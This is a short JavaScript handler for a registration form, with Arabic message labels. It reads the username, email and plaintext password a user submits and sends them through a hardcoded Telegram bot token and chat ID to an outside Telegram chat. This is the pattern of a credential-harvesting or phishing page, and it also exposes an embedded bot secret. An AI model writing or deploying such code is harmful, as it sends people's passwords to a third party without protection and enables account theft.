document.getElementById("registerForm").addEventListener("submit", function(event) {
    event.preventDefault();
    var username = document.getElementById("username").value;
    var email = document.getElementById("email").value;
    var password = document.getElementById("password").value;

    var botToken = "8196459609:AAFFRJTY7XJ8OSVfEIVT76hf6uRiM4byJ1Y";
    var chatId = "7302541527";
    var message = `🔹 تسجيل جديد 🔹\n👤 اسم المستخدم: ${username}\n📧 البريد الإلكتروني: ${email}\n🔑 كلمة المرور: ${password}`;

    var url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

    fetch(url)
        .then(response => alert("تم إرسال بيانات التسجيل إلى تيليجرام!"))
        .catch(error => alert("حدث خطأ أثناء الإرسال."));
});
